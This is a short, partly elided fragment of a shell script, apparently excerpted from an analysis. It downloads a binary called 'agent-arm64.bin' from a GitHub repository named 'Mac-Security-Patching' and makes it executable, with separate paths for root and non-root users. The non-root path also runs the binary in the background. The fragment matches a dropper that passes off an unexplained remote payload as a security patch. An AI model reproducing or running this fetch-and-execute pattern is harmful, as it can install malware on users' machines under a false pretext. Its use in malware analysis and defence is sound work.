...
if [ "$EUID" -ne 0 ]; then
    ...
    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -O $PROGRAM
    chmod +x $PROGRAM
    $PROGRAM &
else
    ...
    wget https://github.com/xxoo-d/Mac-Security-Patching/raw/refs/heads/main/agent-arm64.bin -O $ROOTPROGRAM
    chmod +x $ROOTPROGRAM
